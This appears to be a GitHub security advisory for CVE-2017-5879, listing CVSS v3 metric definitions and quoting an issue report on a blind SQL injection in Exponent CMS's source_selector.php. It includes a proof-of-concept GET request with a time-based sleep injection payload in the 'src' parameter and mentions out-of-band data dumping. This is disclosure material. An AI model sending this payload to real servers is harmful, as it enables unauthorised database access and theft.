# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

## Description

[![@Belladona-c0re](https://avatars.githubusercontent.com/u/7010771?u=33ff5614458933cd5c7a84d871564e2671dc77b3&v=4&size=48)](/Belladona-c0re)[Belladona-c0re](https://github.com/Belladona-c0re)opened [on Feb 6, 2017](https://github.com/exponentcms/exponent-cms/issues/73#issue-205522308)

[CVE-2017-5879](https://github.com/advisories/GHSA-g587-fj22-5v6v "CVE-2017-5879")

This is a blind SQL injection that can be exploited by un-authenticated users via an HTTP GET request and which can be used to dump database data out to a malicious server, using an out-of-band technique, such as select\_loadfile(). The vulnerability affects source\_selector.php andthe following parameter: src.

PoC example:

GET /source\_selector.php?controller=blog&action=showall&src=@random4d4c8bfba590f\'%2b(select\*from(select(sleep(2)))a)%2b\' HTTP/1.1

Host: localhost

Accept: */*

Accept-Language: en

User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

Connection: close
